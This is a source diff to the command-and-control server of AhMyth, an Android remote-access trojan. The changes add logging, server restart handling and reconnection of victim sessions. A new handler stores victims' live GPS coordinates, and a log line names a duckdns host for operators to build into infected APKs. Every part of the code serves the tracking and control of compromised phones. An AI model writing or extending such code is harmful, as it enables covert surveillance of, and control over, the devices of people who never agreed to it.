@@ -6,12 +6,25 @@ var io = require('socket.io');
 var geoip = require('geoip-lite');
 var victimsList = require('./app/assets/js/model/Victim');
 module.exports = victimsList;
+const path = require('path');
+const fs = require('fs');
 //--------------------------------------------------------------
 let win;
 let display;
 var windows = {};
 var IO;
-//--------------------------------------------------------------
+
+// Persistent logging for debugging
+const logFile = path.join(__dirname, 'server_debug.log');
+function logToFile(msg) {
+  const timestamp = new Date().toISOString();
+  const line = `[${timestamp}] ${msg}\n`;
+  console.log(msg);
+  fs.appendFileSync(logFile, line);
+}
+
+logToFile('Server Starting...');
+logToFile('Log file path: ' + logFile);
 
 function createWindow() {
 
@@ -90,8 +103,13 @@ function createWindow() {
   // Emitted when the window is finished loading.
   win.webContents.on('did-finish-load', function () {
     setTimeout(() => {
-      splashWin.close(); //close splash
-      win.show(); //show main
+      // Check if splashWin still exists before closing
+      if (splashWin) {
+        splashWin.close();
+      }
+      if (win) {
+        win.show();
+      }
     }, 2000);
   });
 }
@@ -128,92 +146,196 @@ app.on('activate', () => {
 
 // fired when start listening
 // It will be fired when AppCtrl emit this event
+var currentServer = null;
+var isClosing = false;
+
 ipcMain.on('SocketIO:Listen', function (event, port) {
+  console.log('Received Listen command on port:', port);
 
-  const server = http.createServer();
-  IO = io(server);
-  server.listen(port);
-  IO.sockets.pingInterval = 10000;
-  IO.sockets.on('connection', function (socket) {
-    // Get victim info
-    var address = socket.request.connection;
-    var query = socket.handshake.query;
-    var index = query.id;
-    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
-    var country = null;
-    var geo = geoip.lookup(ip); // check ip location
-    if (geo)
-      country = geo.country.toLowerCase();
+  if (isClosing) {
+    console.log('Server is already closing, ignoring request...');
+    return;
+  }
 
-    // Add the victim to victimList
-    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+  if (currentServer) {
+    console.log('Closing existing server...');
+    isClosing = true;
+    const oldServer = currentServer;
+    currentServer = null;
 
+    // Force close any existing connections if possible
+    oldServer.close(() => {
+      console.log('Existing server closed.');
+      isClosing = false;
+      startNewServer(port);
+    });
 
-    //------------------------Notification SCREEN INIT------------------------------------
-    // create the Notification window
-    let notification = new BrowserWindow({
-      frame: false,
-      x: display.bounds.width - 280,
-      y: display.bounds.height - 78,
-      show: false,
-      width: 280,
-      height: 78,
-      resizable: false,
-      toolbar: false,
-      webPreferences: {
-        nodeIntegration: true
+    // Safety timeout to ensure it doesn't hang forever
+    setTimeout(() => {
+      if (isClosing) {
+        console.log('Server closure timeout, forcing new server start...');
+        isClosing = false;
+        startNewServer(port);
       }
+    }, 2000);
+  } else {
+    startNewServer(port);
+  }
+
+  function startNewServer(port) {
+    console.log('Attempting to start new server on port:', port);
+    const server = http.createServer((req, res) => {
+      logToFile('Incoming HTTP request: ' + req.method + ' ' + req.url + ' from: ' + req.socket.remoteAddress);
+      if (req.url === '/test') {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('AhMyth Server is Running and Reachable!\nTime: ' + new Date().toLocaleString());
+        return;
+      }
+      res.writeHead(200, { 'Content-Type': 'text/plain' });
+      res.end('AhMyth Server - Ready');
+    });
+    currentServer = server;
+
+    // Use simplest init for Socket.IO 1.4.5 compatibility
+    IO = io(server);
+
+    server.listen(port, () => {
+      logToFile('Server is now listening on port: ' + port);
+      logToFile('IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring');
     });
 
-    // Emitted when the window is finished loading.
-    notification.webContents.on('did-finish-load', function () {
-      notification.show();
-      setTimeout(function () { notification.destroy() }, 3000);
-    });
+    IO.sockets.on('connection', function (socket) {
+      const socketIp = socket.conn.remoteAddress || (socket.request.connection && socket.request.connection.remoteAddress) || 'unknown';
+      const socketPort = (socket.request.connection && socket.request.connection.remotePort) || 0;
 
-    notification.webContents.victim = victimsList.getVictim(index);
-    notification.loadURL('file://' + __dirname + '/app/notification.html');
+      logToFile('New Socket.IO connection! ID: ' + socket.id + ' IP: ' + socketIp);
 
+      // Notify UI immediately that *something* connected (for debugging)
+      if (win && win.webContents) {
+        win.webContents.send('SocketIO:Listen', 'Handshaking with ' + socketIp);
+      }
 
+      var query = socket.handshake.query;
+      logToFile('Query params: ' + JSON.stringify(query));
 
-    //notify renderer proccess (AppCtrl) about the new Victim
-    win.webContents.send('SocketIO:NewVictim', index);
+      var index = query.id;
 
-    socket.on('disconnect', function () {
-      // Decrease the socket count on a disconnect
-      victimsList.rmVictim(index);
+      if (!index) {
+        logToFile('REJECTED: No ID provided in query.');
+        return;
+      }
 
-      //notify renderer proccess (AppCtrl) about the disconnected Victim
-      win.webContents.send('SocketIO:RemoveVictim', index);
+      // Robust IP extraction
+      var ip = socketIp || 'unknown';
+      if (ip.includes(':')) {
+        ip = ip.substring(ip.lastIndexOf(':') + 1);
+      }
+      if (ip === '1') ip = '127.0.0.1';
 
+      var country = null;
+      var geo = geoip.lookup(ip); // check ip location
+      if (geo)
+        country = geo.country.toLowerCase();
+
+      console.log('Victim registered:', index, 'IP:', ip);
+
+      // Check if this victim already has an active Lab window
       if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-        //delete the window from windowsList
-        delete windows[index]
+        logToFile('Victim ' + index + ' reconnected. Updating active Lab window socket.');
+        const childWin = BrowserWindow.fromId(windows[index]);
+        if (childWin) {
+          childWin.webContents.victim = socket; // Update the socket reference in the window
+          childWin.webContents.send('SocketIO:VictimReconnected');
+        }
       }
+
+      // Add or Update the victim in victimList
+      victimsList.addVictim(socket, ip, socketPort, country, query.manf, query.model, query.release, index);
+
+      // Theo dõi vị trí từ xa: cập nhật khi client gửi locationUpdate
+      socket.on('locationUpdate', function (data) {
+        const id = query.id;
+        if (victimsList.getVictim(id)) {
+          const lat = data.enable && data.lat != null ? data.lat : null;
+          const lng = data.enable && data.lng != null ? data.lng : null;
+          victimsList.updateLocation(id, lat, lng, !!data.enable);
+          if (win && win.webContents)
+            win.webContents.send('SocketIO:VictimLocationUpdated', id);
+        }
+      });
+
+      //------------------------Notification SCREEN INIT------------------------------------
+      // create the Notification window
+      let notification = new BrowserWindow({
+        frame: false,
+        x: display.bounds.width - 280,
+        y: display.bounds.height - 78,
+        show: false,
+        width: 280,
+        height: 78,
+        resizable: false,
+        toolbar: false,
+        webPreferences: {
+          nodeIntegration: true
+        }
+      });
+
+      // Emitted when the window is finished loading.
+      notification.webContents.on('did-finish-load', function () {
+        notification.show();
+        setTimeout(function () { notification.destroy() }, 3000);
+      });
+
+      notification.webContents.victim = victimsList.getVictim(index);
+      notification.loadURL('file://' + __dirname + '/app/notification.html');
+
+
+
+      //notify renderer proccess (AppCtrl) about the new Victim
+      console.log('Sending SocketIO:NewVictim to UI for index:', index);
+      if (win && win.webContents) {
+        win.webContents.send('SocketIO:NewVictim', index);
+      }
+
+      socket.on('disconnect', function () {
+        logToFile('Victim disconnected: ' + index);
+        // Do NOT remove from persistent victimsList here, just mark as offline if we had status
+        // But for this UI, we might want to remove it to keep the list clean if it's not persistent
+        // According to original code, it removes from victimList:
+        victimsList.rmVictim(index);
+
+        //notify renderer proccess (AppCtrl) about the disconnected Victim
+        if (win && win.webContents) {
+          win.webContents.send('SocketIO:RemoveVictim', index);
+        }
+
+        if (windows[index]) {
+          //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
+          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
+          //delete the window from windowsList
+          delete windows[index]
+        }
+      });
     });
-
-  });
-
+  }
 });
 
 
 //handle the Uncaught Exceptions
 process.on('uncaughtException', function (error) {
-
+  console.error('Uncaught Exception:', error);
   if (error.code == "EADDRINUSE") {
-    win.webContents.send('SocketIO:Listen', "Address Already in Use");
+    if (win && win.webContents)
+      win.webContents.send('SocketIO:Listen', "Address Already in Use");
   } else {
-    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
+    electron.dialog.showErrorBox("ERROR", error.stack || error.message || JSON.stringify(error));
   }
-
 });
 
 
 
-// Fired when Victim's Lab is opened
-ipcMain.on('openLabWindow', function (e, page, index) {
+// Fired when Victim's Lab is opened (startHash optional, e.g. '#/location')
+ipcMain.on('openLabWindow', function (e, page, index, startHash) {
   //------------------------Lab SCREEN INIT------------------------------------
   // create the Lab window
   let child = new BrowserWindow({
@@ -236,7 +358,8 @@ ipcMain.on('openLabWindow', function (e, page, index) {
 
   // pass the victim info to this victim lab
   child.webContents.victim = victimsList.getVictim(index).socket;
-  child.loadURL('file://' + __dirname + '/app/' + page)
+  const labUrl = 'file://' + __dirname + '/app/' + page + (startHash || '');
+  child.loadURL(labUrl)
 
   child.once('ready-to-show', () => {
     child.show();
